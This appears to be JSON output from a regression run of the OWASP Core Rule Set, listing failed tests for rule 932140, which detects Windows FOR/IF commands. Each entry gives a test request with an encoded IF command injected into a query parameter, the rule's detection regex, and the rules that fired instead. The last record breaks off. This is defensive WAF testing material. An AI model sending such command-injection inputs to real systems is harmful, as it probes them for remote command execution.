          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 138,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 138,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+%22%25var%25%22+GEQ+%221%22+ECHO+greater+than+or+equal+to+1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 139,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 139,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+%22%25var%25%22+LEQ+%221%22+ECHO+less+than+or+equal+to+1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 140,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942310 - Detects chained SQL injection attempts 2/2", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 140,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+%22%25ERRORLEVEL%25%22+NEQ+%220%22+%28ECHO+execution+failed%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 141,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 141,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+not+%251+%3D%3D+%22%22+%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 142,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 142,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
